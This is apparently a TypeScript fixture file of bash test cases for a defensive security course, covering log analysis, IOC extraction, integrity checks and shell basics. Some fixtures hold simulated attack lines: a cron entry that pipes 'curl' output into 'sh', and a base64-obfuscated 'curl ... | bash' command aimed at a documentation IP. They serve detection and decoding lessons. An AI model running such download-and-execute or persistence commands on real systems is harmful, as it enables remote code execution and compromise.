// Script-sized differential cases modelled on the course's projects.
import type { DiffCase } from './cases';

const AUTH = Array.from({ length: 40 }, (_, i) => {
  const ips = ['203.0.113.7', '198.51.100.23', '192.0.2.44', '10.20.0.5'];
  const ip = ips[i % 7 === 0 ? 3 : i % 3];
  const ok = ip === '10.20.0.5';
  const user = ok ? 'analyst' : ['root', 'admin', 'oracle', 'test'][i % 4];
  const min = String(Math.floor(i / 4)).padStart(2, '0');
  const sec = String((i * 7) % 60).padStart(2, '0');
  return ok
    ? `Mar 14 10:${min}:${sec} web01 sshd[${2000 + i}]: Accepted publickey for ${user} from ${ip} port ${50000 + i} ssh2`
    : `Mar 14 10:${min}:${sec} web01 sshd[${2000 + i}]: Failed password for ${user === 'root' ? '' : 'invalid user '}${user} from ${ip} port ${50000 + i} ssh2`;
}).join('\n') + '\n';

export const CASES2: DiffCase[] = [
  {
    name: 'brute force detector script',
    files: { 'auth.log': AUTH },
    args: ['auth.log', '5'],
    src: `#!/usr/bin/env bash
set -euo pipefail
log="\${1:?usage: $0 LOGFILE [THRESHOLD]}"
threshold="\${2:-10}"
declare -A fails
while read -r line; do
  [[ $line == *"Failed password"* ]] || continue
  ip=$(awk '{for (i=1;i<=NF;i++) if ($i=="from") print $(i+1)}' <<< "$line")
  fails[$ip]=$(( \${fails[$ip]:-0} + 1 ))
done < "$log"
echo "=== Brute force report (threshold: $threshold) ==="
for ip in $(printf '%s\\n' "\${!fails[@]}" | sort); do
  count=\${fails[$ip]}
  if (( count >= threshold )); then
    printf '%-16s %3d  ALERT\\n' "$ip" "$count"
  else
    printf '%-16s %3d\\n' "$ip" "$count"
  fi
done
`,
  },
  {
    name: 'ioc extractor',
    files: {
      'mail.txt': `From: "IT Support" <support@halden-secure.co>
Subject: Password expiry
Please verify at http://login.halden-secure.co/verify?id=4421 within 24h.
Mirror: https://203.0.113.50/reset.php
Contact helpdesk@halden.example or 10.20.0.9 for help.
`,
    },
    src: `grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' mail.txt | sort -u
grep -oE 'https?://[^ ]+' mail.txt
grep -oE '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' mail.txt | sort -u
grep -oE 'https?://[^/ ]+' mail.txt | sed -E 's#https?://##' | sort -u`,
  },
  {
    name: 'system snapshot style',
    src: `report() {
  local title=$1; shift
  printf '%-12s: %s\\n' "$title" "$*"
}
report "User" "analyst"
report "Shell" "\${SHELL:-unknown}"
items=(cpu mem disk)
report "Checks" "\${#items[@]} (\${items[*]})"
printf '%s\\n' "--------------"`,
  },
  {
    name: 'integrity baseline compare',
    files: { 'etc/hosts': '127.0.0.1 localhost\n', 'etc/sshd_config': 'PermitRootLogin no\n', 'etc/crontab': '0 * * * * root /usr/bin/backup\n' },
    src: `find etc -type f | sort | xargs sha256sum > baseline.txt
echo "* * * * * root curl -s http://x | sh" >> etc/crontab
rm etc/hosts
echo new > etc/motd
sha256sum -c baseline.txt 2>/dev/null | grep -v ': OK$' || true
comm -13 <(cut -d' ' -f3 baseline.txt | sort) <(find etc -type f | sort) 2>/dev/null || find etc -type f | sort | while read -r f; do grep -q " $f$" baseline.txt || echo "NEW: $f"; done`,
  },
  {
    name: 'menu with case and functions',
    stdin: '2\n9\n3\n',
    src: `show_menu() { echo "1) uptime 2) users 3) quit"; }
while true; do
  show_menu
  read -r -p "choice: " choice || break
  case $choice in
    1) echo "up 12 days";;
    2) echo "analyst";;
    3) echo "bye"; break;;
    *) echo "invalid: $choice";;
  esac
done`,
  },
  {
    name: 'decode layers',
    src: `payload=$(printf 'curl -s http://203.0.113.9/x.sh | bash' | base64 | rev)
echo "$payload"
step1=$(echo "$payload" | rev)
echo "$step1" | base64 -d; echo
echo "Uryyb Nanylfg" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`,
  },
  {
    name: 'timeline from mixed logs',
    files: {
      'a.log': 'Mar 14 10:05:00 web01 app: login ok\nMar 14 10:01:00 web01 app: start\n',
      'b.log': 'Mar 14 10:03:30 web01 cron: job ran\nMar 14 10:07:10 web01 sshd: session closed\n',
    },
    src: `cat a.log b.log | sort -k1,1M -k2,2n -k3,3 | awk '{ $4=""; print }' | sed 's/  / /'`,
  },
  {
    name: 'audit lines with printf status',
    files: { 'passwd': 'root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/sh\nanalyst:x:1000:1000::/home/analyst:/bin/bash\nnobody:x:65534:65534::/nonexistent:/usr/sbin/nologin\n' },
    src: `status() { printf '[%-4s] %s\\n' "$1" "$2"; }
uid0=$(awk -F: '$3 == 0 {print $1}' passwd | grep -vx root || true)
if [[ -n $uid0 ]]; then status FAIL "extra UID 0 accounts: $uid0"; else status PASS "only root has UID 0"; fi
shells=$(awk -F: '$7 !~ /nologin|false/ {c++} END {print c+0}' passwd)
(( shells > 2 )) && status WARN "$shells accounts can log in" || status PASS "login shells ok"`,
  },
  {
    name: 'getopts script with usage',
    args: ['-n', '3', '-q', 'file.txt'],
    src: `usage() { echo "usage: $0 [-n N] [-q] FILE" >&2; exit 2; }
n=10; quiet=false
while getopts ":n:q" opt; do
  case $opt in
    n) n=$OPTARG ;;
    q) quiet=true ;;
    :) echo "missing value for -$OPTARG" >&2; usage ;;
    \\?) echo "unknown option -$OPTARG" >&2; usage ;;
  esac
done
shift $((OPTIND - 1))
[[ $# -eq 1 ]] || usage
echo "n=$n quiet=$quiet file=$1"`,
  },
  {
    name: 'trap ERR and pipefail',
    src: `set -o pipefail
trap 'echo "error on line $LINENO (status $?)"' ERR
echo start
grep -q needle <<< "haystack"
echo "after grep"
false | true
echo end`,
  },
  {
    name: 'string manipulation toolkit',
    src: `path=/var/log/nginx/access.log.2.gz
file=\${path##*/}; dir=\${path%/*}; ext=\${file##*.}; base=\${file%%.*}
echo "$file | $dir | $ext | $base"
ip="192.168.010.001"
IFS=. read -r a b c d <<< "$ip"
echo "$((10#$a)).$((10#$b)).$((10#$c)).$((10#$d))"
s="  padded  "; t="\${s#"\${s%%[![:space:]]*}"}"; t="\${t%"\${t##*[![:space:]]}"}"; echo "[$t]"
name="incident_report"; echo "\${name/_/ }" "\${name^}" "\${name//[aeiou]/}"`,
  },
  {
    name: 'array functions and sorting',
    src: `nums=(42 7 19 3 88 19)
sorted=($(printf '%s\\n' "\${nums[@]}" | sort -n))
echo "min=\${sorted[0]} max=\${sorted[-1]} count=\${#sorted[@]}"
unique=($(printf '%s\\n' "\${nums[@]}" | sort -nu))
echo "\${unique[*]}"
sum=0; for n in "\${nums[@]}"; do (( sum += n )); done; echo "sum=$sum avg=$(( sum / \${#nums[@]} ))"`,
  },
  {
    name: 'here-doc report to file',
    src: `host=web01; count=3
cat > report.txt <<EOF
Host:   $host
Alerts: $count
Generated by: \\$USER
EOF
cat report.txt; wc -l < report.txt`,
  },
  {
    name: 'process lines with fields and while',
    files: { 'users.csv': 'name,role,last_login\nmara,admin,2026-03-10\nraj,analyst,2026-01-02\nlee,intern,2025-11-30\n' },
    src: `tail -n +2 users.csv | while IFS=, read -r name role last; do
  y=\${last%%-*}
  if (( y < 2026 )); then echo "STALE: $name ($role) last seen $last"; fi
done`,
  },
  {
    name: 'awk top talkers report',
    files: {
      'access.log': `10.0.0.5 - - [14/Mar/2026:09:00:01 +0000] "GET / HTTP/1.1" 200 512
10.0.0.9 - - [14/Mar/2026:09:00:03 +0000] "GET /admin HTTP/1.1" 404 210
10.0.0.9 - - [14/Mar/2026:09:00:04 +0000] "GET /login HTTP/1.1" 404 210
10.0.0.7 - - [14/Mar/2026:09:01:00 +0000] "POST /login HTTP/1.1" 302 0
10.0.0.9 - - [14/Mar/2026:09:01:02 +0000] "GET /.git/config HTTP/1.1" 404 210
`,
    },
    src: `awk '{ hits[$1]++; if ($9 >= 400) errs[$1]++ } END { for (ip in hits) printf "%s %d %d\\n", ip, hits[ip], errs[ip] }' access.log | sort -k2,2nr -k1,1
awk '$9 == 404 { split($7, parts, "/"); print parts[2] }' access.log | sort | uniq -c`,
  },
  {
    name: 'retry loop with counters',
    src: `attempt=0; max=4
until (( attempt >= max )); do
  (( attempt++ )) || true
  if (( attempt == 3 )); then echo "succeeded on try $attempt"; break; fi
  echo "try $attempt failed"
done`,
  },
  {
    name: 'nested functions return values',
    src: `is_private() {
  local ip=$1
  [[ $ip =~ ^10\\. || $ip =~ ^192\\.168\\. || $ip =~ ^172\\.(1[6-9]|2[0-9]|3[01])\\. ]]
}
classify() { if is_private "$1"; then echo internal; else echo external; fi; }
for ip in 10.1.2.3 8.8.8.8 172.20.0.1 172.32.0.1 192.168.1.1; do printf '%-12s %s\\n' "$ip" "$(classify "$ip")"; done`,
  },
  {
    name: 'read file line count and empty lines',
    files: { 'f.txt': 'a\n\n  b  \nc' },
    src: `n=0; while IFS= read -r line || [[ -n $line ]]; do n=$((n+1)); printf '%d:[%s]\\n' "$n" "$line"; done < f.txt`,
  },
  {
    name: 'sed config edits',
    files: { 'sshd_config': '#Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\nX11Forwarding yes\n' },
    src: `sed -i -E 's/^(PermitRootLogin|PasswordAuthentication) yes/\\1 no/' sshd_config
sed -i 's/^#Port 22/Port 2222/' sshd_config
grep -nE '^(Port|Permit|Password)' sshd_config
sed -n '/X11/=' sshd_config`,
  },
  {
    name: 'sort uniq top N with ties',
    src: `printf 'b\\na\\nc\\na\\nb\\na\\nd\\n' | sort | uniq -c | sort -k1,1nr -k2 | head -3`,
  },
  {
    name: 'command substitution in conditions',
    files: { 'log.txt': 'ERROR one\nINFO two\nERROR three\nWARN four\n' },
    src: `errors=$(grep -c ERROR log.txt)
if [ "$errors" -gt 1 ]; then echo "$errors errors found"; fi
[[ $(wc -l < log.txt) -eq 4 ]] && echo "4 lines"
echo "last error: $(grep ERROR log.txt | tail -1 | cut -d' ' -f2)"`,
  },
  {
    name: 'printf table formatting',
    src: `printf '%-10s %8s %6s\\n' HOST STATUS PCT
printf '%-10s %8s %5.1f%%\\n' web01 up 99.97 db01 down 12.25`,
  },
  {
    name: 'exit codes propagate from script functions',
    src: `check_file() { [[ -f $1 ]] || { echo "missing: $1" >&2; return 4; }; echo "found: $1"; }
touch present
check_file present
check_file absent
echo "rc=$?"
check_file absent || echo "handled"`,
  },
  {
    name: 'xargs and find -print0 style',
    src: `mkdir -p d; touch "d/a b.log" d/c.log d/x.txt
find d -name '*.log' -print0 | sort -z | xargs -0 -n1 basename
find d -type f | wc -l`,
  },
  {
    name: 'continue in while read',
    src: `printf '# comment\\nkeep1\\n\\nkeep2\\n' | while read -r l; do [[ -z $l || $l == \\#* ]] && continue; echo "$l"; done`,
  },
  {
    name: 'local shadowing and globals',
    src: `count=0
inc() { count=$((count + 1)); }
shadow() { local count=100; inc; echo "inside: $count"; }
inc; shadow; echo "outside: $count"`,
  },
  {
    name: 'quote-heavy echo',
    src: `msg='He said "hi"'; echo "$msg"; echo "\${msg//\\"/'}"; echo "a'b" 'c"d'; printf '%s\\n' "\\$PATH is literal"`,
  },
  {
    name: 'select lines by number with awk and sed',
    src: `seq 10 20 | awk 'NR % 3 == 0'; seq 10 20 | sed -n '1~4p'`,
  },
  {
    name: 'arithmetic comparisons and ternaries',
    src: `for score in 95 72 40; do (( score >= 90 )) && grade=A || { (( score >= 70 )) && grade=B || grade=F; }; echo "$score:$grade"; done`,
  },
  {
    name: 'file reads magic bytes and aligns its columns',
    files: {
      'invoice.pdf': 'MZ\x00\x00\x03\x00\x00\x00PE\x00\x00L\x01 invoice viewer (training sample, not a real program)\n',
      'short.exe': 'MZ\x00\x00\x03\x00\x00\x00PE\x00\x00L\x01 training sample\n',
      'report.pdf': '%PDF-1.7\n% training sample\n',
      'notes.txt': 'Meeting notes.\n',
      'update.sh': '#!/bin/bash\necho hi\n',
      'helper': '\x7fELF\x01\x01\x01 training sample\n',
    },
    src: `file invoice.pdf short.exe; file helper invoice.pdf notes.txt report.pdf update.sh; file -b notes.txt; file nope; echo "status $?"`,
  },
  {
    name: 'touch -d / -t / -r set timestamps',
    src: `touch -d "2026-03-10 10:00" a; touch -t 202603121530 b; touch -r a c; stat -c '%y %n' a b c; [ b -nt a ] && echo "b is newer"`,
  },
  {
    name: 'base64 -d stops at the first invalid character',
    src: `echo aWQ= | base64 -d; echo; echo '..%2f..%2fetc' | base64 -d 2>/dev/null; echo "status $?"; x=$(echo 'not base64!' | base64 -d 2>/dev/null); echo "status $? length \${#x}"`,
  },
  {
    name: 'date -d formats used in the timeline lessons',
    src: `date -d "2026-03-13 23:51:02" +%s; date -d "Mar 13 23:51:02 2026" '+%F %T'; date -d "13 Mar 2026 23:58:10" '+%F %T'; date -u -d @1773446000 '+%F %T'; date -d 2026-03-13 +%A; date -d "13/Mar/2026:23:58:10" 2>/dev/null; echo "status $?"`,
  },
  {
    name: 'mktemp makes private files and folders',
    src: `f=$(mktemp); d=$(mktemp -d); stat -c '%a %F' "$f" "$d"; case $f in /tmp/tmp.*) echo "file under /tmp";; esac; g=$(mktemp /tmp/scan.XXXXXX); [ -f "$g" ] && echo "template ok \${#g}"; rm -r "$f" "$d" "$g"`,
  },
  {
    name: 'find -exec is a test and runs in walk order',
    files: { 'd/notes.txt': 'nothing here\n', 'd/secret.txt': 'password=hunter2\n', 'e/only.txt': 'x\n' },
    src: `find d -name '*.txt' -exec grep -q password {} \\; -print; find e -print -exec echo "seen {}" \\;; find d -name '*.txt' ! -exec grep -q password {} \\; -print; echo "status $?"`,
  },
  {
    name: 'find -xdev and -ctime',
    src: `mkdir -p d && touch -d "2026-01-01 10:00" d/old && touch -d "2026-01-01 10:00" d/perm && chmod 600 d/perm; find d -xdev -type f -name perm; find d -type f -ctime -1 | sort; echo "--"; find d -type f -mtime -1; [ "$(stat -c %Z d/perm)" -gt "$(stat -c %Y d/perm)" ] && echo "ctime moved"`,
  },
];
